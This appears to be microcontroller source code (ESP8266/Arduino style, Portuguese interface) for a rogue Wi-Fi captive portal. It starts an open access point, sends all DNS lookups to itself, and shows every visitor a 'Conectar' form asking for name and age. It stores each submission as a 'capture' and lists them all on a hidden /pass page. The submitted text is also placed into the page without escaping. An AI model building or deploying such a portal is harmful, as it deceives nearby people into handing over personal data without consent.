String index() {
  return header(TITLE) + 
         "<form action=/post method=post>"
         "<label for=name>Nome</label><input type=text name=name placeholder='Seu nome' required>"
         "<label for=idade>Idade</label><input type=number name=idade placeholder='Sua idade' required>"
         "<input type=submit value='Conectar'>"
         "</form></div>" + footer();
}

String posted() {
  String name = input("name");
  String idade = input("idade");
  Capturas = "<li><b style='color:#8000ff;'>Nome:</b> " + name + 
             "<br><b style='color:#8000ff;'>Idade:</b> " + idade + "</li>" + Capturas;
  return header(POST_TITLE) + POST_BODY + "</div>" + footer();
}

String pass() {
  return header("Capturas") + "<ol style='color:#fff;text-align:left;'>" + Capturas + "</ol></div>" + footer();
}

void setup() {
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);

  dnsServer.start(DNS_PORT, "*", APIP);

  webServer.on("/post", [](){ webServer.send(HTTP_CODE, "text/html", posted()); });
  webServer.on("/pass", [](){ webServer.send(HTTP_CODE, "text/html", pass()); });
  webServer.onNotFound([](){ webServer.send(HTTP_CODE, "text/html", index()); });

  webServer.begin();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
